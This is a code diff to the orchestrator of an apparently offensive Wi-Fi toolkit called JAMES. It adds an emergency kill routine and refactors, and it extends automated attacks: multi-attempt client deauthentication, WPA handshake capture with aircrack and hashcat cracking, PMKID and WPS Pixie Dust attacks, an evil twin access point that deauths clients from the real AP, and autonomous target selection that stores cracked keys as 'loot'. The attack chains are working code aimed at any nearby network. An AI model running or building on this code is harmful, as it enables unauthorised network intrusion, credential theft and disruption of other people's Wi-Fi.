@@ -6,9 +6,12 @@ skill definitions, and the GUI. Maintains a task log and emits
 signals the GUI can subscribe to.
 """
 
+import glob
 import json
 import logging
 import os
+import re
+import time
 from datetime import datetime
 from pathlib import Path
 from typing import Optional
@@ -46,6 +49,9 @@ class TaskEntry:
             "status": self.status,
         }
 
+# Pre-compiled regex for skill template variable substitution
+_TEMPLATE_VAR_RE = re.compile(r"\{\{(\w+)\}\}")
+
 
 class Orchestrator:
     """
@@ -57,8 +63,10 @@ class Orchestrator:
         aircrack: AircrackSuite wrapper
         hashcat:  Hashcat wrapper
         john:     John wrapper
-        task_log: ordered list of TaskEntry objects
+        task_log: ordered list of TaskEntry objects (capped at MAX_LOG)
     """
+
+    MAX_LOG = 500  # prevent unbounded memory growth
 
     # Common wordlist paths for auto-detection
     _WORDLISTS = [
@@ -94,6 +102,12 @@ class Orchestrator:
 
         # Result cache — persists cracked keys, scan summaries across sessions
         self.loot_cache: dict = self._load_loot()
+
+        # Tool name → object lookup for skill execution (built once)
+        self._tool_map: Optional[dict] = None
+
+        # Skill list cache — avoids re-globbing 37 JSON files on every call
+        self._skill_cache: Optional[list[str]] = None
 
     # ── loot persistence ────────────────────────────────────────
 
@@ -172,11 +186,22 @@ class Orchestrator:
                 self.on_progress(phase, num, total)
             except Exception:
                 pass
+    # ── monitor interface helper ─────────────────────────────────
+
+    def _mon_iface(self, interface: str) -> str:
+        """Derive the monitor-mode interface name from a managed interface.
+        
+        If the interface already ends with 'mon', returns it as-is.
+        Otherwise returns '<interface>mon' (the airmon-ng default).
+        """
+        if interface.endswith("mon"):
+            return interface
+        return f"{interface}mon"
 
     # ── convenience actions ─────────────────────────────────────
 
     def system_check(self) -> dict:
-        """Verify that required tools are installed."""
+        """Verify that required tools are installed (batched for speed)."""
         tools = [
             "nmap", "masscan", "aircrack-ng", "airmon-ng", "airodump-ng",
             "aireplay-ng", "hashcat", "john", "iwconfig",
@@ -188,10 +213,155 @@ class Orchestrator:
             "enum4linux", "smbclient", "arp-scan", "netdiscover",
             "hostapd", "dnsmasq", "hcxpcapngtool",
         ]
-        status = {}
-        for t in tools:
-            status[t] = self.layer.check_tool(t)
-        return status
+        # Single shell command: print each tool that IS found
+        check_cmds = " ".join(f"which {t} 2>/dev/null && echo FOUND:{t};" for t in tools)
+        result = self.layer.run(check_cmds, timeout=15)
+        found = set()
+        for line in result.stdout.splitlines():
+            if line.startswith("FOUND:"):
+                found.add(line[6:])
+        return {t: (t in found) for t in tools}
+
+    # ── kill JAMES ──────────────────────────────────────────────
+
+    def kill_james(self) -> dict:
+        """
+        Emergency stop — kill every tool JAMES may have spawned,
+        restore all wireless interfaces to managed mode, flush
+        iptables, restart NetworkManager, and clean temp files.
+        Returns a summary dict of what was cleaned up.
+        """
+        summary = {"killed": [], "interfaces_restored": [], "errors": []}
+
+        self._print("━" * 50)
+        self._print("🛑 KILL JAMES — Shutting everything down...")
+        self._print("━" * 50)
+        self._emit_progress("Killing processes", 1, 5)
+
+        # ── 1. Kill all known pentesting processes ──────────────
+        kill_targets = [
+            "airodump-ng", "aireplay-ng", "airmon-ng", "aircrack-ng",
+            "hcxdumptool", "hashcat", "john", "nmap", "masscan",
+            "reaver", "bully", "mdk4", "wifite",
+            "responder", "ettercap", "hostapd", "dnsmasq",
+            "hydra", "medusa", "ncrack",
+            "sqlmap", "nikto", "gobuster", "whatweb",
+            "tcpdump", "tshark",
+        ]
+
+        self._print("\n[KILL] Phase 1/5 — Killing tool processes...")
+        # First kill all tracked background processes from the registry
+        registry_killed = self.layer.kill_all_background()
+        if registry_killed:
+            self._print(f"  ✕ Killed {registry_killed} tracked background process(es)")
+            summary["killed"].append(f"{registry_killed} tracked processes")
+
+        # Then broadcast-kill any strays not in the registry
+        pkill_cmd = "; ".join(f"pkill -f {p} 2>/dev/null && echo KILLED:{p}" for p in kill_targets)
+        killall_cmd = "; ".join(f"killall {p} 2>/dev/null" for p in kill_targets)
+        result = self.layer.run(pkill_cmd, sudo=True, timeout=10)
+        self.layer.run(killall_cmd, sudo=True, timeout=10)
+
+        for line in result.stdout.splitlines():
+            if line.startswith("KILLED:"):
+                name = line[7:]
+                summary["killed"].append(name)
+                self._print(f"  ✕ Killed: {name}")
+
+        # Small delay for processes to die
+        time.sleep(1)
+
+        # ── 2. Restore all wireless interfaces to managed mode ──
+        self._print("\n[KILL] Phase 2/5 — Restoring wireless interfaces...")
+        self._emit_progress("Restoring interfaces", 2, 5)
+        try:
+            ifaces = self.aircrack.list_interfaces()
+            for iface in ifaces:
+                name = iface["interface"]
+                mode = iface.get("mode", "").lower()
+                if mode == "monitor" or name.endswith("mon"):
+                    self._print(f"  ↩ Restoring {name} to managed mode...")
+                    self.layer.run(f"airmon-ng stop {name}", sudo=True, timeout=10)
+                    summary["interfaces_restored"].append(name)
+
+            # Also brute-force stop any common monitor interfaces (batched)
+            self.layer.run(
+                "airmon-ng stop wlan0mon 2>/dev/null; "
+                "airmon-ng stop wlan1mon 2>/dev/null; "
+                "airmon-ng stop mon0 2>/dev/null; "
+                "airmon-ng stop mon1 2>/dev/null",
+                sudo=True, timeout=15,
+            )
+
+            # Set interfaces back to up + managed via iw/ifconfig
+            ifaces_after = self.aircrack.list_interfaces()
+            for iface in ifaces_after:
+                name = iface["interface"]
+                self.layer.run(
+                    f"ifconfig {name} down 2>/dev/null && "
+                    f"iwconfig {name} mode managed 2>/dev/null && "
+                    f"ifconfig {name} up 2>/dev/null",
+                    sudo=True, timeout=8,
+                )
+                self._print(f"  ✓ {name} → managed mode, UP")
+        except Exception as e:
+            summary["errors"].append(f"Interface restore: {e}")
+            self._print(f"  [!] Interface restore error: {e}")
+
+        # ── 3. Flush iptables rules (evil twin / MITM cleanup) ──
+        self._print("\n[KILL] Phase 3/5 — Flushing iptables & routing...")
+        self._emit_progress("Flushing iptables", 3, 5)
+        self.layer.run(
+            "iptables --flush && iptables --table nat --flush && "
+            "iptables --table mangle --flush && iptables -P FORWARD DROP && "
+            "echo 0 > /proc/sys/net/ipv4/ip_forward",
+            sudo=True, timeout=10,
+        )
+        self._print("  ✓ iptables flushed, IP forwarding disabled")
+
+        # ── 4. Restart NetworkManager to reconnect Wi-Fi ────────
+        self._print("\n[KILL] Phase 4/5 — Restarting NetworkManager...")
+        self._emit_progress("Restarting NetworkManager", 4, 5)
+        nm_result = self.layer.run("systemctl restart NetworkManager", sudo=True, timeout=15)
+        if nm_result.success:
+            self._print("  ✓ NetworkManager restarted — Wi-Fi should reconnect shortly")
+        else:
+            # Fallback: try service command
+            self.layer.run("service network-manager restart 2>/dev/null", sudo=True, timeout=10)
+            self._print("  ↻ Attempted NetworkManager restart via service command")
+
+        # Also try wpa_supplicant restart
+        self.layer.run("systemctl restart wpa_supplicant 2>/dev/null", sudo=True, timeout=10)
+
+        # ── 5. Clean up temp files ──────────────────────────────
+        self._print("\n[KILL] Phase 5/5 — Cleaning temp files...")
+        self._emit_progress("Cleaning temp files", 5, 5)
+        self.layer.run("rm -f /tmp/james_* 2>/dev/null", timeout=5)
+        self._print("  ✓ Temp files cleaned")
+
+        # ── Summary ─────────────────────────────────────────────
+        self._print("\n" + "━" * 50)
+        self._print(f"🛑 KILL JAMES Complete")
+        self._print(f"  Processes killed:     {len(summary['killed'])}")
+        self._print(f"  Interfaces restored:  {len(summary['interfaces_restored'])}")
+        if summary["errors"]:
+            self._print(f"  Errors:               {len(summary['errors'])}")
+
+        # Verify connectivity
+        self._print("\n  ⏳ Checking internet connectivity...")
+        time.sleep(5)
+        ping = self.layer.run("ping -c 1 -W 3 8.8.8.8", timeout=8)
+        if ping.success:
+            self._print("  ✓ Internet connectivity verified")
+            summary["connectivity"] = True
+        else:
+            self._print("  ⚠ No internet yet — Wi-Fi may take 10-20s to reconnect")
+            self._print("  If stuck, manually reconnect from the network tray.")
+            summary["connectivity"] = False
+
+        self._print("━" * 50)
+
+        return summary
 
     # ── live AP scanner ─────────────────────────────────────────
 
@@ -199,31 +369,118 @@ class Orchestrator:
         """
         Quick scan for nearby Wi-Fi access points.
         Returns structured AP list sorted by signal strength.
+        Auto-enables monitor mode if not already active.
         """
-        import time
         entry = self._log("ap_scan", "airodump-ng", {"interface": interface})
 
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        # Determine / prepare the monitor-mode interface
+        if interface.endswith("mon"):
+            mon_iface = interface
+        else:
+            # Ensure interfering processes are killed and monitor mode is on
+            self._print(f"[AP SCAN] Enabling monitor mode on {interface}...")
+            self.aircrack.check_kill()
+            mon_result = self.aircrack.enable_monitor(interface)
+
+            # airmon-ng may create <iface>mon, mon0, etc. — detect the name
+            mon_iface = f"{interface}mon"
+            ifaces_after = self.aircrack.list_interfaces()
+            for ifc in ifaces_after:
+                if ifc.get("mode", "").lower() == "monitor":
+                    mon_iface = ifc["interface"]
+                    break
+            self._print(f"[AP SCAN] Using monitor interface: {mon_iface}")
 
         prefix = "/tmp/james_apscan"
         self.layer.run(f"rm -f {prefix}*")
-        proc = self.aircrack.start_airodump(mon_iface, write_prefix=prefix)
+        proc = self.aircrack.start_airodump(
+            mon_iface, write_prefix=prefix,
+        )
         time.sleep(duration)
         self.layer.kill_background(proc)
 
-        csv_file = f"{prefix}-01.csv"
+        # Find the CSV file — airodump may name it -01.csv, -02.csv, etc.
+        csv_files = sorted(glob.glob(f"{prefix}*.csv"))
         aps = []
-        try:
-            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
-                parsed = self.aircrack.parse_airodump_csv(f.read())
-                aps = parsed.get("aps", [])
-                aps.sort(key=lambda x: x.get("power", -100), reverse=True)
-        except FileNotFoundError:
-            pass
+        if csv_files:
+            try:
+                with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                    if content.strip():
+                        parsed = self.aircrack.parse_airodump_csv(content)
+                        aps = parsed.get("aps", [])
+                        # Filter out invalid entries (blank BSSIDs, power == -1)
+                        aps = [ap for ap in aps if ap.get("bssid", "").count(":") == 5 and ap.get("power", -1) != -1]
+                        aps.sort(key=lambda x: x.get("power", -100), reverse=True)
+            except Exception as e:
+                self._print(f"[AP SCAN] Failed to parse CSV: {e}")
+                logger.exception("Failed to parse airodump CSV file: %s", csv_files[0])
+        else:
+            self._print("[AP SCAN] No CSV output from airodump-ng — check that the interface supports monitor mode and is not blocked.")
+            logger.error("No airodump-ng CSV files found matching %s*.csv", prefix)
+
+        # Restore managed mode if we enabled monitor ourselves
+        if not interface.endswith("mon"):
+            self.aircrack.disable_monitor(mon_iface)
 
         result = {"aps": aps, "count": len(aps), "duration": duration}
         self._finish(entry, result)
         return result
+
+    def connect_open_wifi(self) -> dict:
+        """Scan and connect to the strongest open Wi-Fi network."""
+        entry = self._log("connect_open", "nmcli", {})
+        self._print("━" * 50)
+        self._print("🌐 Connecting to Open Wi-Fi")
+        self._print("━" * 50)
+        
+        self._print("[WIFI] Rescanning for nearby networks...")
+        self.layer.run("nmcli dev wifi rescan", timeout=10)
+        time.sleep(3)
+        
+        result = self.layer.run("nmcli -t -e no -f BSSID,SSID,SECURITY,SIGNAL dev wifi list", timeout=10)
+        open_aps = []
+        for line in result.stdout.splitlines():
+            line = line.strip()
+            if not line or len(line) < 18: continue
+            
+            bssid = line[:17]
+            rest = line[18:]
+            parts = rest.rsplit(":", 2)
+            if len(parts) != 3: continue
+            
+            ssid, security, signal_str = parts
+            if not security.strip() or security.strip() == "--":
+                try:
+                    open_aps.append((bssid, ssid, int(signal_str)))
+                except ValueError:
+                    pass
+        
+        if not open_aps:
+            msg = "[WIFI] No open Wi-Fi networks found nearby."
+            self._print(msg)
+            res = {"success": False, "error": "No open networks found"}
+            self._finish(entry, res)
+            return res
+            
+        open_aps.sort(key=lambda x: x[2], reverse=True)
+        best_bssid, best_ssid, best_sig = open_aps[0]
+        
+        self._print(f"[WIFI] Found open network '{best_ssid}' ({best_bssid}) at {best_sig}% signal.")
+        self._print(f"[WIFI] Attempting connection to {best_bssid}...")
+        
+        conn = self.layer.run(f"nmcli dev wifi connect '{best_bssid}'", sudo=True, timeout=30)
+        if conn.success or "successfully activated" in conn.stdout:
+            msg = f"✅ Connected to open Wi-Fi: {best_ssid}"
+            self._print(msg)
+            res = {"success": True, "bssid": best_bssid, "ssid": best_ssid, "message": msg}
+        else:
+            msg = f"❌ Failed to connect to {best_ssid}: {conn.stderr.strip() or conn.stdout.strip()}"
+            self._print(msg)
+            res = {"success": False, "error": msg, "bssid": best_bssid, "ssid": best_ssid}
+            
+        self._finish(entry, res)
+        return res
 
     def quick_recon(self, target: str) -> dict:
         """Run a fast nmap scan and log it."""
@@ -278,14 +535,11 @@ class Orchestrator:
         Autonomous PMKID attack: capture PMKID hash via hcxdumptool,
         convert to hashcat format, and crack.
         """
-        import time
-        from pathlib import Path
-
         self._print("[PMKID] Starting clientless PMKID attack...")
 
         # 1. Prep
         self.aircrack.check_kill()
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        mon_iface = self._mon_iface(interface)
         self.start_monitor(interface)
 
         # 2. Capture
@@ -345,7 +599,7 @@ class Orchestrator:
         self._print(f"[WPS] Pixie Dust attack on {bssid} (ch {channel})...")
 
         self.aircrack.check_kill()
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        mon_iface = self._mon_iface(interface)
         self.start_monitor(interface)
 
         entry = self._log("wps_pixie_dust", "reaver", {"bssid": bssid, "channel": channel})
@@ -367,7 +621,7 @@ class Orchestrator:
         Returns a list of discovered WPS-enabled access points.
         """
         self._print("[WPS] Scanning for WPS-enabled access points...")
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        mon_iface = self._mon_iface(interface)
 
         entry = self._log("wps_scan", "wash", {"interface": mon_iface})
         result = self.layer.run(
@@ -400,9 +654,6 @@ class Orchestrator:
         Tries PMKID first (clientless), falls back to handshake capture,
         then attempts WPS Pixie Dust on any WPS-enabled targets.
         """
-        import time
-        from pathlib import Path
-
         results = {"pmkid": None, "handshake": None, "wps": None, "cracked": []}
         self._print("━" * 50)
         self._print("🔥 ONE-CLICK: Wi-Fi Blitz — Multi-Vector Attack")
@@ -411,7 +662,7 @@ class Orchestrator:
         # Phase 1: PMKID (clientless — no deauth needed)
         self._print("\n[PHASE 1/3] PMKID Capture (clientless)")
         self.aircrack.check_kill()
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        mon_iface = self._mon_iface(interface)
         self.start_monitor(interface)
 
         pcapng = "/tmp/james_blitz_pmkid.pcapng"
@@ -435,15 +686,28 @@ class Orchestrator:
         time.sleep(15)
         self.layer.kill_background(proc)
 
-        csv_file = f"{recon_prefix}-01.csv"
-        if Path(csv_file).exists():
-            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+        csv_files = sorted(glob.glob(f"{recon_prefix}*.csv"))
+        if csv_files:
+            with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
                 parsed = self.aircrack.parse_airodump_csv(f.read())
 
             wpa_aps = [ap for ap in parsed["aps"] if "WPA" in ap.get("privacy", "")]
             wpa_aps.sort(key=lambda x: x["power"], reverse=True)
 
+            # Build station→bssid map for targeted deauth
+            station_map = {}
+            for st in parsed.get("stations", []):
+                bssid = st.get("bssid", "")
+                if bssid:
+                    station_map.setdefault(bssid, []).append(st["station_mac"])
+
             for i, target in enumerate(wpa_aps[:3]):
+                # Skip already-cracked targets
+                cached = self.get_cached_key(target["bssid"])
+                if cached:
+                    self._print(f"  ⏭ {target['essid']} already cracked (loot cache): {cached}")
+                    continue
+
                 self._print(f"  → Target {i+1}: {target['bssid']} ({target['essid']}) ch{target['channel']}")
                 cap_prefix = f"/tmp/james_blitz_cap_{i}"
                 self.layer.run(f"rm -f {cap_prefix}*")
@@ -451,21 +715,71 @@ class Orchestrator:
                     mon_iface, channel=target["channel"],
                     bssid=target["bssid"], write_prefix=cap_prefix
                 )
-                time.sleep(3)
-                self.aircrack.deauth(mon_iface, target["bssid"], count=5)
-                time.sleep(10)
+
+                # Multi-attempt deauth with client-targeted approach
+                cap_file = f"{cap_prefix}-01.cap"
+                handshake_ok = False
+                clients = station_map.get(target["bssid"], [])
+
+                for attempt in range(3):
+                    time.sleep(3)
+                    if clients:
+                        # Targeted deauth — much higher success rate
+                        for client_mac in clients[:2]:
+                            self.aircrack.deauth(
+                                mon_iface, target["bssid"],
+                                count=5, client=client_mac,
+                            )
+                            self._print(f"    deauth → client {client_mac} (attempt {attempt+1}/3)")
+                    else:
+                        # Broadcast deauth fallback
+                        self.aircrack.deauth(mon_iface, target["bssid"], count=10)
+                        self._print(f"    deauth → broadcast (attempt {attempt+1}/3)")
+
+                    time.sleep(8)
+                    if Path(cap_file).exists() and self.aircrack.check_handshake(cap_file, target["bssid"]):
+                        handshake_ok = True
+                        break
+
                 self.layer.kill_background(cap_proc)
 
-                cap_file = f"{cap_prefix}-01.cap"
-                if Path(cap_file).exists() and self.aircrack.check_handshake(cap_file, target["bssid"]):
-                    self._print(f"  ✓ Handshake captured for {target['essid']}!")
-                    crack = self.aircrack.crack_wpa(cap_file, wordlist, bssid=target["bssid"])
-                    if crack.get("found"):
-                        self._print(f"  🔑 CRACKED: {target['essid']} → {crack['key']}")
-                        results["cracked"].append({
-                            "method": "handshake", "essid": target["essid"],
-                            "bssid": target["bssid"], "key": crack["key"]
-                        })
+                if not handshake_ok:
+                    self._print(f"  ✕ No handshake for {target['essid']}")
+                    continue
+
+                self._print(f"  ✓ Handshake captured for {target['essid']}! Cracking...")
+
+                # Try aircrack-ng first (CPU)
+                crack = self.aircrack.crack_wpa(cap_file, wordlist, bssid=target["bssid"])
+                if crack.get("found"):
+                    self._print(f"  🔑 CRACKED (aircrack): {target['essid']} → {crack['key']}")
+                    self.cache_cracked_key(target["bssid"], crack["key"], method="handshake", essid=target["essid"])
+                    results["cracked"].append({
+                        "method": "handshake", "essid": target["essid"],
+                        "bssid": target["bssid"], "key": crack["key"]
+                    })
+                    continue
+
+                # Hashcat GPU fallback — convert cap → hc22000 and crack
+                hc_file = f"{cap_prefix}.hc22000"
+                conv = self.hcxtools.extract_hashes(cap_file, hc_file)
+                if conv.get("success"):
+                    self._print(f"  ↻ aircrack failed, trying hashcat (GPU)...")
+                    hc_crack = self.hashcat.crack(hc_file, wordlist, hash_mode=22000, timeout=300)
+                    # Check hashcat output for cracked keys
+                    if hc_crack.get("success") and ":" in hc_crack.get("output", ""):
+                        # Extract key from hashcat output (last field after :)
+                        for line in hc_crack["output"].splitlines():
+                            if ":" in line and not line.startswith("["):
+                                key = line.rsplit(":", 1)[-1].strip()
+                                if key:
+                                    self._print(f"  🔑 CRACKED (hashcat): {target['essid']} → {key}")
+                                    self.cache_cracked_key(target["bssid"], key, method="handshake+hashcat", essid=target["essid"])
+                                    results["cracked"].append({
+                                        "method": "handshake+hashcat", "essid": target["essid"],
+                                        "bssid": target["bssid"], "key": key
+                                    })
+                                    break
 
         # Phase 3: WPS Pixie Dust on any WPS targets
         self._print("\n[PHASE 3/3] WPS Pixie Dust Sweep")
@@ -732,14 +1046,13 @@ CONF""", sudo=True, timeout=5)
         # Phase 3: Launch services
         self._print("\n[PHASE 3/4] Launching Evil Twin AP")
         hostapd_proc = self.layer.run_background(f"hostapd /tmp/james_hostapd.conf", sudo=True)
-        import time
         time.sleep(2)
         dnsmasq_proc = self.layer.run_background(f"dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True)
         time.sleep(1)
 
         # Phase 4: Deauth real AP
         self._print("\n[PHASE 4/4] Deauthing clients from real AP")
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        mon_iface = self._mon_iface(interface)
         self.layer.run(f"timeout 20 aireplay-ng -0 30 -a {target_bssid} {mon_iface}", sudo=True, timeout=25)
 
         self._print("\n👿 Evil Twin is LIVE!")
@@ -768,25 +1081,29 @@ CONF""", sudo=True, timeout=5)
             return json.load(f)
 
     def list_skills(self) -> list[str]:
-        """Return names of available skill files."""
-        if not SKILLS_DIR.exists():
-            return []
-        return [p.stem for p in SKILLS_DIR.glob("*.json")]
+        """Return names of available skill files (cached)."""
+        if self._skill_cache is None:
+            if not SKILLS_DIR.exists():
+                self._skill_cache = []
+            else:
+                self._skill_cache = sorted(p.stem for p in SKILLS_DIR.glob("*.json"))
+        return self._skill_cache
+
+    def invalidate_skill_cache(self):
+        """Force re-scan of skills directory on next list_skills() call."""
+        self._skill_cache = None
 
     def auto_wifi_pwn(self, interface: str, wordlist: str) -> dict:
         """
         Fully autonomous end-to-end Wi-Fi auditing workflow.
         Selects target, captures handshake, and cracks it.
         """
-        import time
-        from pathlib import Path
-        
         self._print("[AUTOPWN] Starting autonomous Wi-Fi audit...")
         
         # 1. Prep
         self.aircrack.check_kill()
         mon_result = self.start_monitor(interface)
-        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
+        mon_iface = self._mon_iface(interface)
         
         # 2. Recon
         self._print("[AUTOPWN] Scanning for targets (15s)...")
@@ -794,19 +1111,16 @@ CONF""", sudo=True, timeout=5)
         self.layer.run(f"rm -f {recon_prefix}*")
         
         proc = self.aircrack.start_airodump(mon_iface, write_prefix=recon_prefix)
-        # We need to add --output-format csv manually or just let it write all.
-        # Wait, the start_airodump wrapper doesn't pass --output-format csv.
-        # But airodump-ng writes .csv by default anyway (recon_prefix-01.csv).
         time.sleep(15)
         self.layer.kill_background(proc)
         
         # 3. Target Selection
-        csv_file = f"{recon_prefix}-01.csv"
-        if not Path(csv_file).exists():
+        csv_files = sorted(glob.glob(f"{recon_prefix}*.csv"))
+        if not csv_files:
             self.stop_monitor(mon_iface)
             return {"error": "Failed to generate scan results."}
             
-        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+        with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
             parsed = self.aircrack.parse_airodump_csv(f.read())
             
         # Filter WPA APs and sort by power
@@ -868,7 +1182,7 @@ CONF""", sudo=True, timeout=5)
 
     def execute_skill_steps(self, skill: dict, context: dict):
         """Execute the steps of a skill sequentially using the provided context."""
-        from james.layers.native import CommandResult
+        from james.layers.native import CommandResult  # noqa: local to avoid circular at module level
 
         self._print(f"[SKILL] Running: {skill.get('name', 'unknown')}")
 
@@ -880,9 +1194,8 @@ CONF""", sudo=True, timeout=5)
                     var_name = v[2:-2].strip()
                     params[k] = context.get(var_name, v)
                 elif isinstance(v, str):
-                    # Also do inline {{var}} substitution within strings
-                    import re
-                    for match in re.finditer(r"\{\{(\w+)\}\}", v):
+                    # Inline {{var}} substitution using pre-compiled regex
+                    for match in _TEMPLATE_VAR_RE.finditer(v):
                         vname = match.group(1)
                         v = v.replace(match.group(0), context.get(vname, match.group(0)))
                     params[k] = v
@@ -892,34 +1205,18 @@ CONF""", sudo=True, timeout=5)
             try:
                 if "." in action:
                     tool_name, method_name = action.split(".", 1)
-                    if tool_name == "nmap":
-                        target_obj = self.nmap
-                    elif tool_name == "aircrack":
-                        target_obj = self.aircrack
-                    elif tool_name == "hashcat":
-                        target_obj = self.hashcat
-                    elif tool_name == "john":
-                        target_obj = self.john
-                    elif tool_name == "masscan":
-                        target_obj = self.masscan
-                    elif tool_name == "responder":
-                        target_obj = self.responder
-                    elif tool_name == "harvester":
-                        target_obj = self.harvester
-                    elif tool_name == "sslscan":
-                        target_obj = self.sslscan
-                    elif tool_name == "wafdetect":
-                        target_obj = self.wafdetect
-                    elif tool_name == "ettercap":
-                        target_obj = self.ettercap
-                    elif tool_name == "reaver":
-                        target_obj = self.reaver
-                    elif tool_name == "hcxtools":
-                        target_obj = self.hcxtools
-                    elif tool_name == "layer":
-                        target_obj = self.layer
-                    else:
-                        target_obj = self
+                    # Lazy-init tool map (built once, reused)
+                    if self._tool_map is None:
+                        self._tool_map = {
+                            "nmap": self.nmap, "aircrack": self.aircrack,
+                            "hashcat": self.hashcat, "john": self.john,
+                            "masscan": self.masscan, "responder": self.responder,
+                            "harvester": self.harvester, "sslscan": self.sslscan,
+                            "wafdetect": self.wafdetect, "ettercap": self.ettercap,
+                            "reaver": self.reaver, "hcxtools": self.hcxtools,
+                            "layer": self.layer,
+                        }
+                    target_obj = self._tool_map.get(tool_name, self)
                 else:
                     target_obj = self
                     method_name = action
@@ -958,6 +1255,9 @@ CONF""", sudo=True, timeout=5)
         entry = TaskEntry(action, tool, params)
         entry.status = "running"
         self.task_log.append(entry)
+        # Evict oldest entries to prevent unbounded memory growth
+        if len(self.task_log) > self.MAX_LOG:
+            self.task_log = self.task_log[-self.MAX_LOG:]
         if self.on_task_update:
             self.on_task_update(entry)
         logger.info("[task] %s → %s %s", action, tool, params)
